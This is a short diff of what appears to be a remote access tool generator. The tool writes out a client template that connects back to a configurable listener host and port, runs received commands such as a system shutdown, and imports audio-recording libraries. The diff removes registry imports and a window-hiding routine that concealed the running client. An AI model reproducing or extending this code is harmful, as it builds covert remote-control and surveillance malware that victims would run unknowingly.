@@ -154,10 +154,6 @@ import platform
 import sounddevice
 from scipy.io.wavfile import write
 import time
-import winreg
-import win32gui
-import win32con
-import winreg as reg 
 clientHOST = "{ListenerHost}"
 clientPORT = {ListenerPort}
 BUFFER_SIZE = 1024
@@ -217,9 +213,6 @@ while True:
             os.system("shutdown now")
     elif Handler_DATA == "exit":
         s.close()
-
-hideWindow = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(hideWindow , win32con.SW_HIDE)
             '''
         )
         time.sleep(1)
